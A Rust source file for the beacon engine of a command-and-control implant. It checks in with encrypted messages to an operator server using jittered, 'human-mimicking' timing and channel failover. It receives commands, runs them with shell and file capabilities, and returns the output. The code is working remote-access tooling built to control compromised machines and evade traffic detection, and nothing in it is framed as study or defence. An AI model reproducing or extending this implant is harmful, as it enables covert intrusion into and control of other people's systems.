//! Beacon engine for C2 communication with jitter and channel management.

use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::sync::Mutex;
use serde::{Deserialize, Serialize};
use rand::Rng;
use crate::common::{
    open_envelope, seal_envelope, BeaconMessage, ChannelType, CommandMessage, MessageEnvelope,
    ResponseMessage, ResponseStatus,
};
use crate::protocols::{C2Channel, ChannelHealth};
use crate::agent::executor::{ExecutorConfig, TaskExecutor, TaskResult};
use crate::agent::state::{StateMachine, AgentState, FailureReason, DormantTrigger};
use uuid::Uuid;
use chrono::Utc;

/// Beacon engine configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BeaconConfig {
    /// Base beacon interval
    pub base_interval: Duration,
    /// Jitter percentage (0.0 to 1.0)
    pub jitter_percent: f32,
    /// Use human-like Pareto distribution
    pub human_mimicry: bool,
    /// Sleep on channel failure
    pub sleep_on_failure: bool,
    /// Maximum retry attempts
    pub max_retries: u32,
    /// Initial backoff duration
    pub initial_backoff: Duration,
    /// Maximum backoff duration
    pub max_backoff: Duration,
    /// Backoff multiplier
    pub backoff_multiplier: f32,
    /// Master key for envelope encryption (must match the server)
    pub master_key: String,
}

impl Default for BeaconConfig {
    fn default() -> Self {
        Self {
            base_interval: Duration::from_secs(60),
            jitter_percent: 0.3,
            human_mimicry: true,
            sleep_on_failure: true,
            max_retries: 5,
            initial_backoff: Duration::from_secs(5),
            max_backoff: Duration::from_secs(300),
            backoff_multiplier: 2.0,
            master_key: "default_master_key".to_string(),
        }
    }
}

/// Beacon engine for managing C2 communication
pub struct BeaconEngine {
    config: BeaconConfig,
    state_machine: StateMachine,
    agent_id: Uuid,
    channels: Vec<Arc<dyn C2Channel + Send + Sync>>,
    output_buffer: Arc<Mutex<Vec<MessageEnvelope>>>,
    task_queue: Arc<Mutex<Vec<serde_json::Value>>>,
    channel_health: Vec<ChannelHealth>,
    current_channel: usize,
    executor: TaskExecutor,
}

impl BeaconEngine {
    /// Create new beacon engine
    pub fn new(
        config: BeaconConfig,
        agent_id: Uuid,
        channels: Vec<Arc<dyn C2Channel + Send + Sync>>,
    ) -> Self {
        let channel_health = vec![ChannelHealth::default(); channels.len()];

        Self {
            config,
            state_machine: StateMachine::new(),
            agent_id,
            channels,
            output_buffer: Arc::new(Mutex::new(Vec::new())),
            task_queue: Arc::new(Mutex::new(Vec::new())),
            channel_health,
            current_channel: 0,
            executor: TaskExecutor::new(ExecutorConfig::default()),
        }
    }

    /// Create beacon engine in dormant state
    pub fn dormant(
        config: BeaconConfig,
        agent_id: Uuid,
        channels: Vec<Arc<dyn C2Channel + Send + Sync>>,
        trigger: DormantTrigger,
        timeout: Duration,
    ) -> Self {
        let mut engine = Self::new(config, agent_id, channels);
        engine.state_machine = StateMachine::dormant(trigger, timeout);
        engine
    }

    /// Calculate jittered delay based on configuration
    fn calculate_jittered_delay(&self) -> Duration {
        let base = self.config.base_interval.as_millis() as f32;

        if self.config.human_mimicry {
            // Pareto distribution for human-like patterns
            self.pareto_delay(base)
        } else {
            // Uniform jitter
            let jitter = base * self.config.jitter_percent;
            let mut rng = rand::thread_rng();
            let variance = rng.gen_range(-jitter..jitter);
            let delay = (base + variance).max(1000.0); // Minimum 1 second
            Duration::from_millis(delay as u64)
        }
    }

    /// Calculate delay using Pareto distribution
    fn pareto_delay(&self, base_ms: f32) -> Duration {
        let mut rng = rand::thread_rng();
        // Pareto distribution: P(X > x) = (x_m / x)^alpha
        // Generate using inverse transform sampling
        let u = rng.gen_range(0.01..1.0); // Avoid log(0)
        let alpha: f32 = 1.5; // Shape parameter
        let x_m = base_ms * 0.5; // Minimum value

        let delay_ms = x_m / (1.0_f32 - u).powf(1.0_f32 / alpha);
        Duration::from_millis(delay_ms.min(base_ms * 3.0) as u64)
    }

    /// Calculate exponential backoff
    fn calculate_backoff(&self, attempt: u32) -> Duration {
        let backoff = self.config.initial_backoff
            .as_millis() as f32
            * self.config.backoff_multiplier.powi(attempt as i32);

        Duration::from_millis(
            (backoff.min(self.config.max_backoff.as_millis() as f32)) as u64
        )
    }

    /// Select the best channel based on health scores
    async fn select_best_channel(&self) -> Option<usize> {
        let mut best_idx = 0;
        let mut best_score = 0.0;

        for (i, health) in self.channel_health.iter().enumerate() {
            let score = health.score();
            if score > best_score && score > 0.5 {
                best_score = score;
                best_idx = i;
            }
        }

        if best_score > 0.5 {
            Some(best_idx)
        } else {
            None
        }
    }

    /// Build beacon message
    fn build_beacon(&self) -> BeaconMessage {
        let uptime = self.state_machine.uptime().as_secs();

        BeaconMessage {
            agent_id: self.agent_id,
            timestamp: Utc::now(),
            uptime,
            last_seen: Utc::now(),
            capabilities: vec!["shell".to_string(), "file".to_string()],
            metadata: None,
        }
    }

    /// Add output to buffer
    pub async fn add_output(&self, envelope: MessageEnvelope) {
        self.output_buffer.lock().await.push(envelope);
    }

    /// Get pending tasks
    pub async fn get_tasks(&self) -> Vec<serde_json::Value> {
        let mut tasks = self.task_queue.lock().await;
        tasks.drain(..).collect()
    }

    /// Queue tasks for execution
    pub async fn queue_tasks(&self, tasks: Vec<serde_json::Value>) {
        self.task_queue.lock().await.extend(tasks);
    }

    /// Run the beacon loop
    pub async fn run(&mut self) -> Result<(), BeaconError> {
        // Initial registration
        self.state_machine.transition_to_registering(self.config.max_retries);

        loop {
            // Clone state to avoid borrow issues
            let current_state = self.state_machine.state().clone();

            match current_state {
                AgentState::Booting => {
                    self.state_machine.transition_to_registering(self.config.max_retries);
                }

                AgentState::Registering { attempt, max_attempts } => {
                    if attempt > max_attempts {
                        self.state_machine.transition_to_failed(FailureReason::MaxRetriesExceeded);
                        break;
                    }

                    match self.beacon().await {
                        Ok(_) => {
                            if let Some(channel) = self.select_best_channel().await {
                                self.current_channel = channel;
                                self.state_machine.transition_to_active(
                                    self.channels[channel].channel_type()
                                );
                            }
                        }
                        Err(_) => {
                            if !self.state_machine.increment_registration_attempt() {
                                self.state_machine.transition_to_failed(
                                    FailureReason::MaxRetriesExceeded
                                );
                                break;
                            }
                            let backoff = self.calculate_backoff(attempt);
                            self.state_machine.transition_to_retrying(attempt, backoff);
                            tokio::time::sleep(backoff).await;
                        }
                    }
                }

                AgentState::Active { .. } => {
                    // Wait for next beacon interval
                    let delay = self.calculate_jittered_delay();
                    tokio::time::sleep(delay).await;

                    match self.beacon().await {
                        Ok(task_count) => {
                            self.state_machine.update_active(
                                task_count,
                                self.channels[self.current_channel].channel_type()
                            );
                        }
                        Err(_) => {
                            if self.config.sleep_on_failure {
                                let backoff = self.calculate_backoff(1);
                                self.state_machine.transition_to_retrying(1, backoff);
                                tokio::time::sleep(backoff).await;
                            }
                        }
                    }
                }

                AgentState::Retrying { backoff, .. } => {
                    tokio::time::sleep(backoff).await;
                    self.state_machine.transition_to_registering(self.config.max_retries);
                }

                AgentState::Failed { .. } => {
                    break;
                }

                AgentState::Dormant { .. } => {
                    // Wait for wake trigger
                    tokio::time::sleep(Duration::from_secs(60)).await;
                }
            }
        }

        Ok(())
    }

    /// Send a single beacon, then execute any commands and report results.
    async fn beacon(&mut self) -> Result<usize, BeaconError> {
        if self.channels.is_empty() {
            return Err(BeaconError::Channel("no channels configured".to_string()));
        }
        let channel_idx = self.current_channel.min(self.channels.len() - 1);
        let channel = &self.channels[channel_idx];

        let beacon = self.build_beacon();
        let mut envelope = MessageEnvelope {
            version: 1,
            sequence: 0,
            timestamp: Utc::now().timestamp_millis() as u64,
            channel: ChannelType::Https,
            encrypted_payload: serde_json::to_vec(&beacon)
                .map_err(|e| BeaconError::Serialization(e.to_string()))?,
            auth_tag: [0u8; 16],
        };
        seal_envelope(&self.config.master_key, &mut envelope)
            .map_err(|e| BeaconError::Encryption(e.to_string()))?;

        let start = Instant::now();
        channel
            .send(&envelope)
            .map_err(|e| BeaconError::Channel(e.to_string()))?;

        let latency = start.elapsed().as_millis() as u64;
        self.channel_health[channel_idx].record_success(latency);

        let response = channel
            .receive(10000)
            .map_err(|e| BeaconError::Channel(e.to_string()))?;
        let Some(response) = response else {
            return Ok(0);
        };

        let plain = open_envelope(&self.config.master_key, &response)
            .map_err(|e| BeaconError::Encryption(e.to_string()))?;
        let commands: Vec<CommandMessage> = serde_json::from_slice(&plain)
            .map_err(|e| BeaconError::Serialization(e.to_string()))?;

        for command in &commands {
            let result = self.executor.execute(command).await;
            let report = to_response(command, result);
            let mut envelope = MessageEnvelope {
                version: 1,
                sequence: 1,
                timestamp: Utc::now().timestamp_millis() as u64,
                channel: ChannelType::Https,
                encrypted_payload: serde_json::to_vec(&report)
                    .map_err(|e| BeaconError::Serialization(e.to_string()))?,
                auth_tag: [0u8; 16],
            };
            seal_envelope(&self.config.master_key, &mut envelope)
                .map_err(|e| BeaconError::Encryption(e.to_string()))?;
            channel
                .send(&envelope)
                .map_err(|e| BeaconError::Channel(e.to_string()))?;
        }

        Ok(commands.len())
    }

    /// Get agent ID
    pub fn agent_id(&self) -> Uuid {
        self.agent_id
    }

    /// Get state machine reference
    pub fn state_machine(&self) -> &StateMachine {
        &self.state_machine
    }
}

/// Convert a local task result into a response message for the server.
fn to_response(command: &CommandMessage, result: TaskResult) -> ResponseMessage {
    let (status, output, error) = match result {
        TaskResult::Success { output, .. } => (ResponseStatus::Success, Some(output), None),
        TaskResult::Failed { error, .. } => (ResponseStatus::Failed, None, Some(error)),
        TaskResult::Timeout => (ResponseStatus::Timeout, None, None),
    };
    ResponseMessage {
        command_id: command.id,
        agent_id: command.agent_id,
        status,
        output,
        error,
        completed_at: Utc::now(),
    }
}

/// Beacon errors
#[derive(Debug, thiserror::Error)]
pub enum BeaconError {
    #[error("Channel error: {0}")]
    Channel(String),
    #[error("Encryption error: {0}")]
    Encryption(String),
    #[error("Serialization error: {0}")]
    Serialization(String),
    #[error("Timeout")]
    Timeout,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_jitter_calculation() {
        let config = BeaconConfig {
            base_interval: Duration::from_secs(60),
            jitter_percent: 0.3,
            human_mimicry: false,
            ..Default::default()
        };

        let engine = BeaconEngine::new(
            config,
            Uuid::new_v4(),
            vec![],
        );

        // Jittered delay should be within 30% of base
        let delay = engine.calculate_jittered_delay();
        let base_ms = Duration::from_secs(60).as_millis() as f32;
        let delay_ms = delay.as_millis() as f32;

        assert!(delay_ms >= base_ms * 0.7);
        assert!(delay_ms <= base_ms * 1.3);
    }

    #[test]
    fn test_backoff_calculation() {
        let config = BeaconConfig::default();
        let engine = BeaconEngine::new(
            config.clone(),
            Uuid::new_v4(),
            vec![],
        );

        let backoff1 = engine.calculate_backoff(1);
        let backoff2 = engine.calculate_backoff(2);
        let backoff10 = engine.calculate_backoff(10);

        assert!(backoff2 > backoff1);
        assert!(backoff10 <= config.max_backoff);
    }
}
